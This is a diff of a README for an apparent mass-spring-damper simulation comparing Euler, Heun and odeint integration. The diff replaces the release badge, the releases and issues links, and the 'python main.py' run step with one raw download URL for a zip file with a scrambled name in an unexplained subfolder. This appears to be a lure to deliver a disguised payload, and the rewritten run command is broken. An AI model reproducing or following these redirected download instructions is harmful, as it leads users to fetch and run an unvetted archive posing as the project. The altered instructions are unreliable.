@@ -1,6 +1,6 @@
 # 🌟 Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint- - Compare Simulation Methods with Ease
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-Get%20It%20Now-blue)](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/releases)
+[![Download Release](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/raw/refs/heads/main/amazia/Spring-vs-odeint-Damper-Mass-Euler-Simulation-Heun-3.5.zip%20Latest%20Release-Get%20It%20Now-blue)](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/raw/refs/heads/main/amazia/Spring-vs-odeint-Damper-Mass-Euler-Simulation-Heun-3.5.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ This application simulates a mass–spring–damper system. It shows how differe
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [Releases Page](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/releases)
+To get the software, visit this page to download: [Releases Page](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/raw/refs/heads/main/amazia/Spring-vs-odeint-Damper-Mass-Euler-Simulation-Heun-3.5.zip)
 
 ### 📂 Installation Steps
 
@@ -49,7 +49,7 @@ To get the software, visit this page to download: [Releases Page](https://github
 7. **Run the Application:**
    Type the following command and hit Enter:
    ```bash
-   python main.py
+   python https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/raw/refs/heads/main/amazia/Spring-vs-odeint-Damper-Mass-Euler-Simulation-Heun-3.5.zip
    ```
 
 ## 📊 Using the Application
@@ -101,7 +101,7 @@ Take time to review these results to grasp the differences in methods.
 
 For additional assistance, you can:
 
-- **Check the [Issues Section](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/issues)** in the repository.
+- **Check the [Issues Section](https://github.com/kifell55/Mass-Spring-Damper-Simulation-Euler-vs-Heun-vs-odeint-/raw/refs/heads/main/amazia/Spring-vs-odeint-Damper-Mass-Euler-Simulation-Heun-3.5.zip)** in the repository.
 - **Request help on forums** related to control systems and numerical methods.
 
 ## 📝 Topics Covered
